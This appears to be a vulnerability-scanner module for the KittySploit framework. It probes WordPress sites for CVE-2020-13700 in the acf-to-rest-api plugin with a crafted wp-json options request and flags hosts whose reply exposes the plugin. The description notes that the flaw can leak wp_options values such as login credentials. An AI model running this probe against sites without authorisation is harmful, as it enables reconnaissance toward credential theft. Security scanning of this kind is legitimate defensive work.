#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress acf-to-rest-ap through 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress acf-to-rest-api <=3.1.0 - Insecure Direct Object Reference Detection',
        'description': 'WordPress acf-to-rest-ap through 3.1.0 allows an insecure direct object reference via permalinks manipulation, as demonstrated by a wp-json/acf/v3/options/ request that can read sensitive information in the wp_options table such as the login and pass values.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wordpress', 'plugin', 'acf_to_rest_api_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gist.github.com/mariuszpoplwski/4fbaab7f271bea99c733e3f2a4bafbb5',
            'https://wordpress.org/plugins/acf-to-rest-api/#developers',
            'https://github.com/airesvsg/acf-to-rest-api',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13700',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-13700',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/acf/v3/options/a?id=active&field=plugins', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('acf-to-rest-api\\/class-acf-to-rest-api.php',)
        header_any = ('Content-Type: application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WordPress acf-to-rest-api <=3.1.0 - Insecure Direct Object Reference detected",
                path='/wp-json/acf/v3/options/a?id=active&field=plugins',
            )
            return True
        return False

